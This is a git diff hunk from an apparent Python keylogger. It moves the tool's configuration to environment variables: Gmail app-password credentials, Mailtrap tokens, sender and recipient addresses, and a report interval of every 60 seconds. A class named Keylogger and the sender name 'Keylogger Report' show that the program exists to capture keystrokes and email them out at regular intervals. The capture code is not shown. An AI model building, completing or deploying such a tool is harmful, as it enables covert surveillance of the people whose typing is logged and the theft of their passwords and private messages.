@@ -5,18 +5,20 @@ import mailtrap as mt
 import datetime
 import os
 import time
+from dotenv import load_dotenv
 
-# Configuration (customize these)
-EMAIL_ADDRESS = "your_email@gmail.com"  # Replace with your email (used for sending if Mailtrap fails)
-# IMPORTANT: Use an App Password here!
-EMAIL_PASSWORD = "your_gmail_app_password"  # Replace with your Gmail App Password
-SEND_REPORT_EVERY = 60  # Send report every 60 seconds
+# Load environment variables from .env file
+load_dotenv()
 
-# Mailtrap Configuration
-MAILTRAP_TOKEN = ""  # Your Mailtrap token
-MAILTRAP_SENDER_EMAIL = ""  # Your Mailtrap sender email
-MAILTRAP_SENDER_NAME = "Keylogger Report"  # Sender name
-MAILTRAP_RECIPIENT_EMAIL = ""  # Recipient email
+# Configuration (loaded from .env)
+EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
+EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
+SEND_REPORT_EVERY = int(os.getenv("SEND_REPORT_EVERY") or 60)
+  # Default to 60 if not set
+MAILTRAP_TOKEN = os.getenv("MAILTRAP_TOKEN")
+MAILTRAP_SENDER_EMAIL = os.getenv("MAILTRAP_SENDER_EMAIL")
+MAILTRAP_SENDER_NAME = os.getenv("MAILTRAP_SENDER_NAME", "Keylogger Report")  # Default value
+MAILTRAP_RECIPIENT_EMAIL = os.getenv("MAILTRAP_RECIPIENT_EMAIL")
 
 
 class Keylogger:
